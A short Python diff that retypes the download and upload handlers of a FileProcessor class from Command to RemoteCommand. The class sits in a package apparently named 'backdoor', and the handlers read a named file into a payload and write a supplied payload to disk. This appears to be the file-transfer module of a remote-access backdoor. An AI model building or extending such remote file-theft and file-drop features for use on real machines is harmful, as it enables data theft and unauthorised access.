@@ -1,7 +1,7 @@
 from pathlib import Path
 from backdoor.exceptions.core import InvalidArgumentException
 from backdoor.files.io import FileReader, FileWriter
-from backdoor.models.commands import Command, CommandResult
+from backdoor.models.commands import RemoteCommand, CommandResult
 
 
 class FileProcessor:
@@ -10,7 +10,7 @@ class FileProcessor:
         self.file_writer = file_writer
         self.file_reader = file_reader
 
-    def download(self, command: Command) -> CommandResult:
+    def download(self, command: RemoteCommand) -> CommandResult:
         if not command.args:
             raise InvalidArgumentException("file path not provided")
         path = command.args[0]
@@ -21,7 +21,7 @@ class FileProcessor:
             payload=content,
         )
 
-    def upload(self, command: Command) -> CommandResult:
+    def upload(self, command: RemoteCommand) -> CommandResult:
         if not command.args:
             raise InvalidArgumentException("file name not provided")
         if not command.payload:
